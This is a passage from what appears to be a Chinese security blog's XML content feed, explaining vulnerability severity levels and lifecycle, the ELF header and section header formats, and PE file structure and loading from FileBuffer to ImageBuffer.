标准根据漏洞的严重程度把漏洞分为四个等级，分别为低危漏洞（0.13.9）、中危漏洞（4.06.9）、高危漏洞（7.08.9）和超危漏洞（9.010.0）。</li><li>超危漏洞（Critical）<ul><li>该类型的漏洞使得远程攻击者不需要任何特殊的身份验证就可以轻松获取对主机的完全控制权，利用此类漏洞可能会对根级别的服务器或整个网络基础设施系统造成损害。</li></ul></li><li>高危漏洞（High）</li><li>该类型的漏洞可能会使攻击者获取对主机的控制权限，漏洞利用可能导致特权提升、敏感信息的泄漏或者宕机等风险。</li><li>中危漏洞（Medium）</li><li>此类型的漏洞一般很难被利用，往往需要攻击者通过社会工程学的手段或者与被攻击对象处于同一局域网中才可能访问存储在主机上的特定信息。此级别的漏洞可能会造成文件内容的部分泄露、对主机上某些文件的访问以及目录浏览等。、</li><li>低危漏洞（Low）：<ul><li>该类漏洞的影响一般很小，利用这些漏洞通常需要本地或物理接入方式访问系统。攻击者可以收集有关主机的信息（例如，开放的端口和服务等），并且利用这些信息来查找其他漏洞。</li></ul></li></ul></li><li>漏洞生命周期<ul><li>漏洞生命周期主要包含漏洞产生、漏洞发现、漏洞公开、补丁发布、补丁应用以及漏洞消亡六个阶段。</li><li>对于一个漏洞，漏洞产生是指在软件的设计、开发和发布过程中引入该漏洞的阶段；</li><li>漏洞发现是指通过人工或自动工具挖掘出该漏洞的阶段；</li><li>漏洞公开是指软件厂商或其它研究人员在世界范围内公开该漏洞的技术细节以及验证代码；</li><li>补丁发布是指厂商或其它研究人员向软件用户发布用于修复该漏洞的代码或替换文件；</li><li>补丁应用是指软件用户根据发布的补丁文件，对存在漏洞的软件进行修复的过程；</li><li>漏洞消亡是指在补丁发布且大部分用户已经进行相应修复操作后该漏洞继续大规模存在的可能性较低的阶段。</li><li>不同阶段的漏洞名称<ul><li>从漏洞产生到漏洞发现之间，由于并未有任何个人或组织感知到该漏洞的存在，因此，此时的漏洞称为未知漏洞。相应的，漏洞发现以后的漏洞称为已知漏洞。在已知漏洞中，根据是否被公开可以划分为未公开漏洞和已公开漏洞。为了将漏洞在被发现后的不同阶段进行细粒度区分，人们引入了零日漏洞（0-day）、一日漏洞（1-day）以及历史漏洞的概念。</li><li>0-day 漏洞是指从漏洞发现到补丁发布之前的漏洞；1-day 漏洞是指在补丁发布到补丁应用之间的漏洞；历史漏洞是指大部分软件用户已经进行针对性修复之后的漏洞。</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0 ELF简介</title>
      <link href="/2023/12/18/Security/binary/ELF/0.ELF%E7%AE%80%E4%BB%8B/"/>
      <url>/2023/12/18/Security/binary/ELF/0.ELF%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="elf简介">ELF简介</h2><blockquote><p>可执行与可链接格式（Executable and Linkable Format，ELF），是Linux操作系统上的默认二进制格式</p></blockquote><p>ELF用于<mark>可执行文件、对象文件、共享库及核心转储</mark>。64位ELF二进制格式与32位是相似的，主要区别在于某些头部字段和其他数据结构的大小和顺序。</p><table><thead><tr><th>类型</th><th>实例</th></tr></thead><tbody><tr><td>可重定位的对象文件(Relocatable file)</td><td>.o;.a;.ko</td></tr><tr><td>可执行的对象文件(Executable file)</td><td>vi、gdb、及我们用链接器生成的可执行文件、bash shell 程序</td></tr><tr><td>可被共享的对象文件(Shared object file)</td><td>.so</td></tr><tr><td>核心转储文件(Core Dump File)</td><td>当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其他信息转储到核心转储文件 core dump</td></tr></tbody></table><p>64位ELF二进制文件的格式和内容:</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260953102.png" alt="image-20220923111646425" style="zoom:80%;" /><p>ELF二进制文件实际上包含4种类型的组件：</p><ul><li><p>ELF 头部（executable header，也称为可执行文件头）、</p></li><li><p>一系列（可选）程序 头、</p></li><li><p>多个节、</p></li><li><p>节对应的各个（可选）节头。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2 ELF节头</title>
      <link href="/2023/12/18/Security/binary/ELF/2.ELF%E8%8A%82%E5%A4%B4/"/>
      <url>/2023/12/18/Security/binary/ELF/2.ELF%E8%8A%82%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="elf节头">ELF节头</h2><blockquote><p><mark>ELF二进制文件中的代码和数据在逻辑上被分为连续的非重叠块，称为节（section）</mark>。节没有任何预设的结构体，相反，每个节的结构体取决于内容。实际上，<mark>节甚至可能没有任何特定的结构体</mark>。通常，节只不过是代码或者数据的非结构化blob。每个节由节头描述，节头指定了节的属性，并允许你找到节中字节的位置。二进制文件中所有节的节头都包含在节头表中。</p></blockquote><p>对节进行划分为链接器的使用提供了方便，当然节也可以被其他工具解析（如静态二进制分析工具），这意味着在设置进程和虚拟内存来执行二进制文件的时候，实际上并不需要每个节所包含的数据，有些节所包含的数据在执行的时候是根本不需要的，如<mark>符号信息或者重定位信息</mark>。</p><p>由于节只为链接器提供视图，因此节头表是ELF格式的可选部分，不需要链接的ELF二进制文件不需要有节头表。如果没有节头表，则ELF头部中的e_shoff字段将设置为零。</p><p>为了在进程中加载并执行二进制文件，<mark>需要对二进制文件中的代码和数据进行不同的组织，为此ELF二进制文件指定了另一种逻辑组织， 称为段（segment）</mark>，它们在执行的时候使用，与节相对，节在链接的时候使用。</p><p><strong>节的内容的逻辑组织只在链接时（被静态分析工具使用时）存在，在运行时不存在。</strong></p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260955261.png" alt="image-20220923161000516" style="zoom:80%;" /><h4 id="sh_name字段">sh_name字段</h4><p>节头的第一个字段称为sh_name，如果该字段被设 置，则在字符串表中包含索引，如果索引为零，则表示该节没有名称。</p><h4 id="sh_type字段">sh_type字段</h4><p>每个节都有类型，类型由一个称为sh_type的整数字段表示，该类 型告诉链接器关于该节内容结构的信息，图2-1显示了最重要的节类型 信息，这里我们将按顺序讨论各个重要的节类型。</p><ul><li>类型为SHT_PROGBITS的节包含了程序数据，如机器指令或常量，这些节没有特定的结构供链接器解析。</li><li>符号表还有特殊的节类型（对静态符号表来说是SHT_SYMTAB，对动态链接器使用的符号表来说是SHT_DYNSYM）和字符串表（SHT_STRTAB）。</li><li>SHT_REL或SHT_RELA类型的节对链接器特别重要，因为它们包含格式明确的重定位项（elf.h中的结构体Elf64_Rel和结构 体Elf64_Rela），链接器可以解析该重定位项以在其他节中进行重定位。每个重定位项都会告诉链接器二进制文件中需要重定位的特定位 置，以及重定位需要解析的符号。实际上重定位的过程相当复杂，这里 不赘述。要注意的是，<mark>SHT_REL和SHT_RELA类型的节用于静态链接。</mark></li><li>SHT_DYNAMIC类型的节包含动态链接所需的信息，该信息使用elf.h中的结构体Elf64_Syn。</li></ul><h4 id="sh_flags字段">sh_flags字段</h4><p>节标志（在sh_flags字段指定）描述了有关节的其他信息，这里最重要的标志是SHF_WRITE、SHF_ALLOC及SHF_EXECINSTR。</p><ul><li>SHF_WRITE指示该节在运行时可写，这样可以轻松地区分包含静态 数据（如常量）的节和包含变量的节。</li><li>SHF_ALLOC指示在执行二进制文件时将节的内容加载到虚拟内存，尽管实际上二进制文件的加载是使用段视图（segment view）而不是节视图（section view）。</li><li>SHF_EXECINSTR指示该节包含可执行指令，这对反汇编二进制文件来说很有用。</li></ul><h4 id="sh_addr-sh_offset及sh_size字段">sh_addr、sh_offset及sh_size字段</h4><p>sh_addr、sh_offset及sh_size字段分别描述该节的虚拟地址、文件偏移（文件的起始字节数）及大小（字节）。</p><p>乍一看，描述节的虚拟地址的字段（如sh_addr）在这里似乎不合适，毕竟这些节仅用于链接进程，而不用于创建和执行进程。但是尽管如此，<mark>链接器有时需要知道特定的代码和数据在运行时最终会在哪个地址进行重定位</mark>， 而sh_addr字段会提供此信息。当设置进程的sh_addr值为零时，节不会被加载到虚拟内存中。</p><h4 id="sh_link字段">sh_link字段</h4><p>有时链接器需要了解节与节之间的关系，例如与SHT_SYMTAB、SHT_DYNSYM或者SHT_DYNAMIC类型的节有关联的字符串表节，其中包含相关符号的名称。类似地，重定位节（SHT_REL或SHT_RELA类型）与描述重定位所涉及符号的符号表相关联，sh_link字段通过表示相关节的索引（在节头表中）使这些关系变得清晰。</p><h4 id="sh_info">sh_info</h4><p>sh_info字段存放关于节的额外信息，这些额外信息依赖于节类型 （section type）。例如对于SHT_REL和SHT_RELA类型的重定位节，sh_info存放的是应用重定位节的节头索引。</p><h4 id="sh_addralign字段">sh_addralign字段</h4><p>某些节需要以特定方式在内存中对齐，来提高内存访问的效率。如节可能需要在偏移量为8字节或者16字节倍数的地址处进行加载，这些对齐的要求在sh_addralign字段中指定。如果该字段设置为16，意味 着该节的基址必须为16的倍数（由链接器指定）。保留值0和1均指示无特殊对齐需要。</p><h4 id="sh_entsize字段">sh_entsize字段</h4><p>某些节（如符号表或者重定位表）包含固定大小的条目，如Elf64_Sym或Elf64_Rela。对于这些节，sh_entsize指定了每个条目的长度字节数，如果节中并不包含固定长度条目的表格，那 么sh_entsize取值为0。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1 ELF头</title>
      <link href="/2023/12/18/Security/binary/ELF/1.ELF%E5%A4%B4%E9%83%A8/"/>
      <url>/2023/12/18/Security/binary/ELF/1.ELF%E5%A4%B4%E9%83%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="elf头部">ELF头部</h2><blockquote><p>每个ELF二进制文件都是从ELF头部开始的，该头部是一系列结构化的字节，这些字节可以告诉你这是一个什么样的ELF二进制文件，以及在文件的什么地方查找其他内容。要找出ELF头部的格式，可以在/usr/include/elf.h或者ELF规范中查找其类型定义（以及其他与ELF相关的类型和常量的定义）。</p></blockquote><p>64位ELF文件头部：</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260954380.png" alt="image-20220923112118154" style="zoom: 80%;" /><p>ELF头部在此以C结构体Elf64_Ehdr的形式表示。如果你在/usr/include/elf.h中查找该结构体的定义，你可能会注意到给出的结构体定义包含诸如Elf64_Half和Elf64_word的类型。这些类型只用于uint16_t和uint32_t等整数类型的预定义（typedef）。</p><h4 id="e_ident数组">e_ident数组</h4><p>ELF头部（和ELF二进制文件）以被称为e_ident的16字节数组开始。e_ident数组始终以4字节的“幻数”开头，以此标识该文件为ELF二进制文件。<mark><strong>幻数由十六进制数字0x7f组成，后跟字母E、L及F的ASCII字符代码。</strong></mark></p><p>紧跟在幻数后面，有更多字节提供了有关ELF二进制文件类型规范的详细信息。在elf.h中，这些字节的索引（e_ident数组中4～15的索引）分别被称为EI_CLASS、EI_DATA、EI_VERSION、EI_OSABI、EI_ABIVERSION 及EI_PAD等。</p><ul><li><p>EI_CLASS字节代表ELF规范中二进制文件的“类”。这有点用词不当，因为“类”一词如此通用，几乎可以指任何东西。该字节真正表示的是该二进制文件用于32位还是64位体系结构。EI_CLASS字节设置为常量ELFCLASS32（等于1）或ELFCLASS64（等于2）；</p></li><li><p>EI_DATA字节指示二进制文件的字节序。值为ELFDATA2LSB（等于1）表示小端字节序，值为ELFDATA2MSB（等于2）表示大端字节序。<u>与架构的位宽相关的是架构的字节序，多字节值（如整数）在内存中是以最低有效字节优先（小端），还是最高有效字节优先（大端）；</u></p></li><li><p>EI_VERSION字节指示创建二进制文件时使用的ELF规范版本。当前唯一的有效值是EV_CURRENT，它被定义为1。</p></li><li><p>EI_OSABI和EI_ABIVERSION字节表示的是关于应用程序二进制接口（Application Binary Interface，ABI）和操作系统（Operating System，OS）的信息。如果EI_OSABI字节设置为非零，则意味着在ELF二进制文件中会使用一些ABI-或者OS-的具体扩展名。这可能会改变二进制文件中某些字段的含义，也可能表示存在非标准节。默认值零表示该二进制文件以UNIX System V ABI为目标。EI_ABIVERSION字节 表示二进制目标EI_OSABI字节指定的ABI的具体版本。通常该值为零，因为使用默认的EI_OSABI时无须指定任何版本信息。</p></li><li><p>EI_PAD字节实际上包含多字节，即e_ident中9～15的索引。这些字节当前都被指定填充。它们被保留供将来之用，但当前设置为零。</p></li></ul><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260954945.png" alt="image-20220923112859483" style="zoom:80%;" /><p>在清单2-2中，e_ident数组在标记为Magic❶的行上显示，它以熟悉的4个幻数字节开头，后跟数字2（指示ELFCLASS64），然后是数字 1（ELFDATA2LSB），最后是数字1（EV_CURRENT）。由于EI_OSABI和 EI_ABIVERSION字节为默认值，因此其余字节全部为零，填充字节也为零。某些字节中包含的信息在指定行上重复声明，分别标记为Class、Data、Version、OS/ABI及ABI Version❷等。</p><h4 id="e_type-e_machine及e_version字段">e_type、e_machine及e_version字段</h4><p>在e_ident数组之后，出现了一系列多字节整数字段。其中第一个称为e_type，该字段指定了二进制文件的类型。在这里最常遇到的值是<mark>ET_REL（表示可重定位的对象文件）、ET_EXEC（可执行二进制文件）及ET_DYN（动态库，也称为共享对象文件</mark>）。</p><p>Machine字段❹，表示二进制文件计划在体系结构上运行。如EM_X86_64，EM_386（32位 x86）和EM_ARM（ARM二进制）。</p><p>e_version字段的作用与e_ident数组中的EI_VERSION字节相 同。具体来说，它表示创建二进制文件时使用的ELF版本规范。由于该字段为32位宽，你可能会认为有很多可能的值，但实际上，唯一可能的值是1（EV_CURRENT），指定版本规范1。</p><h4 id="e_entry字段">e_entry字段</h4><p>e_entry字段表示二进制文件的入口点，这是应该开始执行的虚拟地址。是解释器（通常是指 <a href="http://ld-linux.so">ld-linux.so</a>）将二进制文件加载到虚拟内存后转移控制权的地方。入口点也是递归反汇编的有用起点。</p><h4 id="e_phoff和e_shoff字段">e_phoff和e_shoff字段</h4><p>分别指定了程序头表（program header table）和节头表（section header table）距离开始的偏移量。</p><p>对于示例二进制文件，偏移量分别为64字节和6632字节（清单2-2中在❼处的两行）。偏移量也可以设置为零，以指示该文件不包含程序头表或者节头表。需要注意，这些字段都是文件偏移量，意味着你应该读取文件获得ELF头部的字节数。换句话说，与前面讨论的e_entry字段不一 样，e_phoff和e_shoff指定的不是虚拟地址。</p><h4 id="e_flags字段">e_flags字段</h4><p>e_flags字段保存了二进制文件在特定处理器的标志。</p><p>例如，计划在嵌入式平台上运行的ARM二进制文件可以在e_flags字段设置ARM特定标志，以指示关于嵌入式操作系统的其他详细信息（文件格式约定、堆栈组织等）。对于x86二进制文件，e_flags通常设置为零，因此无须过多关注。</p><h4 id="e_ehsize字段">e_ehsize字段</h4><p>e_ehsize字段以字节单位指定了ELF头部的大小。如在readelf输出中看到的那样，对于64位x86二进制文件，ELF头部大小始终为64字节，而对于32位x86二进制文件，ELF头部的大小始终为52字节。</p><h4 id="e_phentsize和e_phnum字段e_shentsize和e_shnum字段">e_phentsize和e_phnum字段\e_shentsize和e_shnum字段</h4><p>e_phoff和e_shoff字段指向程序头表和节头表开始的文件偏移位置。但是，要用链接器或加载器（或处理ELF二进制文件的其他程序） 遍历这些表，实际上还需要其他信息。具体地说，它们需要知道表中各个程序头或者表中各个节头的大小，以及每个表中程序头和节头的数量。这些信息由程序头表的e_phentsize和e_phnum字段，以及节头表的e_shentsize和e_shnum字段提供。在清单2-2中的示例二进制文件中，一共有9个程序头，每个程序头有56字节；一共有31个节头，每个节头有64字节❾。</p><h4 id="e_shstrndx字段">e_shstrndx字段</h4><p>e_shstrndx字段包含一个名为.shstrtab的、与特殊字符串表节（string table section）相关的头索引（在节头表中）。这是一个专用节，其中包含一个以空值结尾的ASCII字符串表，该表将所有节的名称存储在二进制文件中。ELF处理工具（如readelf）使用它来正确显示节的名称。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260954257.png" alt="image-20220923153756288" style="zoom:80%;" />]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE加载过程 FileBuffer-ImageBuffer</title>
      <link href="/2023/12/18/Security/binary/PE/PE%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/"/>
      <url>/2023/12/18/Security/binary/PE/PE%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="pe加载过程-filebuffer-imagebuffer">PE加载过程 FileBuffer-ImageBuffer</h1><h2 id="一-filebuffer到imagebuffer常见的误区">一、FileBuffer到ImageBuffer常见的误区</h2><h3 id="1文件执行的总过程">1.文件执行的总过程</h3><ul><li><p>我们知道一个硬盘上的文件读入到内存中（FileBuffer），是原封不动的将硬盘上的文件数据复制一份放到内存中</p></li><li><p>接着如果文件要运行，需要先将FileBuffer中的文件数据&quot;拉伸&quot;，重载到每一个可执行文件的4GB虚拟内存中！此时称文件印象或者内存印象，即ImageBuffer</p></li><li><p>但是ImageBuffer就是文件运行时真正在内存中状态吗？或者说文件在ImageBuffer中就是表示文件被执行了吗？不！！！！！！</p></li><li><p><strong>在ImageBuffer中的文件数据由于按照一定的规则被&quot;拉伸&quot;，只是已经无线接近于可被windows执行的文件格式了！但是此时还不代表文件已经被执行了，因为此时文件也只是处在4GB的虚拟内存中，如果文件被执行操作系统还需要做一些事情，将文件真正的装入内存中，等待CPU的分配执行</strong></p></li><li><p>所以不要理解为ImageBuffer中的状态就是文件正在被执行，后面操作系统还要做很多事情才能让ImageBuffer中的文件真正执行起来的</p><h3 id="2sizeofrawdata一定大于miscvirtualsize">2.SizeOfRawData一定大于Misc.VirtualSize？</h3></li><li><p>SizeOfRawData表示此节在硬盘上经过文件对齐后的大小；Misc.VirtualSize表示此节没有经过对齐的在内存中的大小。那么是不是说SizeOfRawData一定大于Misc.VirtualSize呢？不一定！！！！！！！</p></li><li><p>我们写C语言的时候知道如果你定义一个数组已经初始化，比如<strong>int arr[1000] = {0}</strong>;，此时编译成.exe文件存放在硬盘上时，这1000个int类型的0肯定会存放在某一个节中，并且分配1000个0的空间，这个空间大小是多少，最后重载到ImageBuffer时还是多少，即Misc.VirtualSize不管文件在硬盘上还是内存中的值都是一致的。所以，SizeOfRawData一般都是大于Misc.VirtualSize的</p></li><li><p>但是如果我们定义成<strong>int arr[1000]</strong>;，表示<strong>数据还未初始化</strong>，并且如果程序中没有使用过或初始化过这块内存空间，那么我们平时看汇编会发现其实编译器还没有做任何事情，这就只是告诉编译器需要留出1000个int宽度大小的内存空间。所以如果某一个节中存在已经被定义过但还未初始化的数据，那么文件在硬盘上不会显式的留出空间，即<strong>SizeOfRawData中不会算上未初始化数据的空间</strong>；但是此节的<strong>Misc.VirtualSize为加载到内存中时节的未对齐的大小</strong>，那么这个值就需要算上给未初始化留出来空间后的整个节的大小，故在内存中的节本身的总大小可能会大于硬盘中的此节文件对齐后的大小。</p></li></ul><h2 id="二-模拟pe加载过程">二、模拟PE加载过程</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260959713.jpg" alt="img"></p><ol><li>我们先在硬盘上找一个可执行文件，将文件的数据复制到内存中，即FileBuffer中（前面的练习做过很多次了）</li><li>根据SizeOfImage的大小，再使用malloc开辟一块ImageBuffer（SizeOfImage即为文件加载到4GB内存的大小）</li><li>因为NT头和节表文件对齐后的这段数据经过PE loader加载到ImageBuffer是不会变的，所以直接可以将NT头和节表文件对齐后的这块数据从FileBuffer中复制到ImageBuffer中</li><li>接着就是复制所有节的数据：需要使用循环，先复制第一个节的内容。通过第一个节对应节表中的<strong>PointerToRawData</strong>的值确定第一个节的起始地址；再通过<strong>SizeOfRawData</strong>的值得到从起始地址开始需要复制多少字节的数据到<strong>ImageBuffer</strong>中；再接着将这些数据复制到<strong>ImageBuffer</strong>中的哪个位置呢？ 就需要再通过此节对应的节表中的<strong>VirtualAddress</strong>决定将数据从<strong>ImageBuffer</strong>中的哪个地址开始赋值，由于是相对地址，所以还需要知道<strong>ImageBase</strong>，但是！！我们是模拟PE的加载过程，<strong>此时ImageBuffer的首地址是由malloc申请的，不是ImageBase！<strong>所以我们需要使用malloc申请的</strong>首地址 + VirtualAddress</strong>就是最终将第一节数据复制到ImageBuffer中的起始地址。后面的节的数据以此类推从FileBuffer复制到ImageBuffer中</li></ol><blockquote><p>为什么选择SizeOfRawData，不选择Misc.VirtualSize来确定需要复制的节的大小？因为上面说过，Misc.VirtualSize的值由于节中有未初始化的数据且未使用而计算出预留的空间装入内存后的总大小的值可能会很大，如果这个值大到已经包含了后面一个节的数据，那么按照这个值将FileBuffer中的数据复制到ImageBuffer中很可能会把下一个节的数据也复制过去，所以直接用SizeOfRawData就可以了。但是如果节中包含未初始化数据，这样做起始就不太准确了，但是可以大致模拟这个过程即可</p></blockquote><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260959058.jpg" alt="img"></p><h2 id="三-内存偏移到文件偏移计算">三、内存偏移到文件偏移计算</h2><p>比如一个文件加载到4GB内存中的某一个数据地址为0x501234，那么怎么算出这个内存地址对应到文件在硬盘上时的地址是多少，即算出相对于文件的偏移地址？</p><ol><li>先算出此内存地址相对于文件在内存中的起始地址的偏移量</li><li>接着通过这个偏移量循环和每一个节的VirtualAddress做比较，当此偏移量大于某一个节的VirtualAddress并且小于此VirtualAddress + Misc.VirtualSize，就说明这个内存地址就在这个节中</li><li>再用此偏移量 - （此节的VirtualAddress + 文件在内存中的起始地址）得到这个内存地址相对于所在节的偏移量</li><li>接着找内存地址所在节的PointerToRawData，通过PointerToRawData + 聂村地址相对于所在节的偏移量来得到此内存地址在硬盘上时相对于文件的偏移量</li></ol><ul><li>举例：现在我们要找0x501234对应的文件偏移是多少？</li><li>0x501234 - 0x500000 = 0x1234</li><li>因为0x1000 &lt; 0x1234 &lt; 0x1000 + Misc.VirtualSize，所以0x501234在可执行文件的第一个节中</li><li>0x501234 - （0x50000 + 0x1000） = 0x234</li><li>由于第一个节的PointerToRawData为0x400，文件在硬盘上的起始地址为0（相对的），所以0x400 + 0x234 = 0x634</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260959455.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制分析 </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件</title>
      <link href="/2023/12/18/Security/binary/PE/0.PE%E7%AE%80%E4%BB%8B/"/>
      <url>/2023/12/18/Security/binary/PE/0.PE%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="pe简介">PE简介</h2><blockquote><p>可移植可执行（Portable Executable，PE）格式。由于PE是Windows操作系统上使用的主要二进制格式，因此熟悉PE格式对在Windows操作系统上分析常见的二进制恶意软件非常有用。</p><p>PE是通用对象文件格式（Common Object File Format，COFF）的修改版本，在被ELF取代之前，COFF还在UNIX操作系统上使用。PE有时也被称为PE/COFF。让人困惑的是，PE的64位版本被称为PE32+。PE32+和原始PE格式相比只有很小的差异。</p></blockquote><p>图3-1中显示的数据结构在WinNT.h中定义，该文件包含在Windows的软件开发工具包（Software Development Kit，SDK）中。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404260959046.png" alt="image-20220924100815226" style="zoom:80%;" /><h3 id="1ms-dos头和ms-dos存根">1.MS-DOS头和MS-DOS存根</h3><blockquote><p>MS-DOS是Microsoft在1981年发行的一款操作系统，Microsoft为了实现向后兼容，将其包含在二进制格式中。</p></blockquote><p>引入PE格式时，有一段过渡期，即用户同时使用老旧的MS-DOS二进制文件和较新的PE二进制文件。为了避免在过渡期人们对此产生混淆，每个PE二进制文件都会以MS-DOS头开始，因此从狭义的角度来讲，PE二进制文件也可以被解释为MS-DOS二进制文件。MS-DOS头的主要功能是描述如何加载并执行MS-DOS存根。该存根通常只是一段很小的MS-DOS程序，当用户在MS-DOS操作系统上执行PE二进制文件的时候，存根就会被执行，而不是主程序。</p><p><mark><strong>MS-DOS头以一个幻数作为开头，该值由“MZ”的ASCII字符码组成。</strong></mark></p><p><u>MS-DOS头中唯一重要的字段是最后一个字段，被称为e_lfanew。该字段包含了实际PE二进制文件开始的文件偏移量（也就是NT头相对文件起始地址的偏移）</u>。因此，当PE加载器打开二进制文件的时候，它会自动读取MS-DOS头并跳过它和MS-DOS存根，然后直接进入PE头的开始位置。</p><h3 id="2pe签名-pf文件头及pe可选头">2.PE签名、PF文件头及PE可选头</h3><blockquote><p>“可执行文件头”由3部分组成：32位的PE签名（signature）、PE文件头以及PE可选头。可能会认为IMAGE_NT_HEADERS64作为PE格式的可执行文件头是一个整件，但实际上，PE签名、PE文件头和PE可选头是3个独立的实体。</p></blockquote><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261000184.png" alt="image-20220924102235778" style="zoom:80%;" /><h4 id="pe签名">PE签名</h4><p>PE签名就是一个包含“PE”的ASCII字符码的字符串，后面跟着两个NULL字符。它类似于ELF头部中e_ident字段中的幻数字节。</p><h4 id="pe文件头">PE文件头</h4><p>PE文件头描述了PE二进制文件的一般属性。其中最重要的字段有：Machine、NumberOfSections、SizeOfOptionalHeader及Characteristics。用来描述两个符号表的字段已经被废弃了，并且PE二进制文件不应该再使用嵌入的符号和调试信息，而可以选择将这些符号作为单独的调试文件共享出来。</p><ul><li>Machine字段描述了PE二进制文件所对应的<mark>机器体系结构</mark>。在这个示例中是x86-64，定义的常数为0x8664❶。</li><li>NumberOfSections字段表示<mark>节表的条目数</mark>，</li><li>SizeOfOptionalHeader表示<mark>PE可选头的大小</mark>（对于32位操作系统，通常为0x00E0，对于64位操作系统，通常为0x00F0）。</li><li>Characteristics字段包含了描述<mark>二进制文件的各种属性标志位</mark>，如字节序是否为动态链接库（DynamicLinkLibrary，DLL）文件、是否被剥离（stripped）等。</li></ul><h4 id="pe可选头">PE可选头</h4><p>PE可选头对PE二进制文件来说并不是真的可选（不过它可能会在对象文件中丢失）。事实上，任何PE文件都有PE可选头。PE可选头包含许多字段，接下来会介绍几个非常重要的字段。</p><p>首先，这里有一个16位的幻数值，对64位的PE二进制文件来说，这个值是0x020b❸。<u>这里还有几个字段用于描述创建二进制文件链接器的主/次要版本号，以及运行二进制文件时所需的最低操作系统版本。</u>ImageBase字段❻描述了加载二进制文件的地址（PE二进制文件被设计为需要在指定的虚拟地址进行加载）。其他指针字段如相对虚拟地址（RelativeVirtualAddress，RVA），作用是将其与ImageBase基址进行相加，得出虚拟地址。如BaseOfCode字段❺为代码段起始地址的RVA。因此，你可以通过计算ImageBase+BaseOfCode找到代码段的虚拟地址。可能你已经猜到了，AddressOfEntryPoint字段❹包含了二进制文件的入口点地址，同时也是一个RVA。</p><p>可选头中最不容易解释的字段可能就是DataDirectory数组❼。DataDirectory包含了名为IMAGE_DATA_DIRECTORY结构体类型的条目，包括其RVA和大小。在DataDirectory数组中，每个条目都描述了二进制文件重要部分的起始RVA和大小，通过DataDirectory数组的索引，我们可以精确地解释对应的条目。最重要的条目是索引0，该条目描述了导出目录的RVA和大小（导出表）；索引1的条目描述的是导入目录（导入表）；索引5描述了重定位表。在讨论PE节的时候，我将详细讨论导出表和导入表的内容。DataDirectory本质上就是加载器的快捷方式，使用它可以快速地查找数据的特定部分，而不用遍历节表。</p><h3 id="3节表">3.节表</h3><blockquote><p>在很多部分，PE的节表与ELF的节表很相似</p></blockquote><p>PE的节表是IMAGE_SECTION_HEADER结构的数组，每个结构描述一个节，<mark>表示该节在磁盘和在内存中的大小（SizeOfRawData和VirtualSize）、文件的偏移量和虚拟地址（PointerToRawData和VirtualAddress）、重定位信息和各种属性标志（Characteristics）。</mark></p><p>==属性标志用于说明该节是可执行的、可读的，抑或是某种组合。==PE节头没有像ELF节头那样引用字符串表，而是使用简单的字符数组字段指定节名称，该字段也被称为Name域。因为数组只有8字节长，所以PE节的名称被限制在8个字符内。与ELF不同，PE格式没有明确区分节和段。PE文件最接近ELF执行视图的是DataDirectory，它为加载器提供了设置执行二进制代码重要部分的快捷方式。除此以外，PE格式没有单独的程序头表。节表则用来链接和加载。</p><h3 id="4节">4.节</h3><blockquote><p>PE二进制文件中许多节可以直接与ELF的节进行比较，甚至经常连名称也几乎相同。</p></blockquote><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261000834.png" alt="image-20220924103306532" style="zoom:80%;" /><p>有一个.text节的代码段，.rdata节包含只读数据（相当于ELF中的.rodata节），.data节包含可读/可写的数据段，还有一个.bss节用于零初始化数据，还有一个.reloc节，里面包含重定位信息。</p><p><strong>需要注意的一件事情是，像Visual Studio这样的PE编译器有时会将只读数据放在.text节中（与代码混合），而不是单独放在.rdata节中，这在反汇编的时候可能会出现问题，因为这可能会意外地将常量数据解释为指令。</strong></p><h4 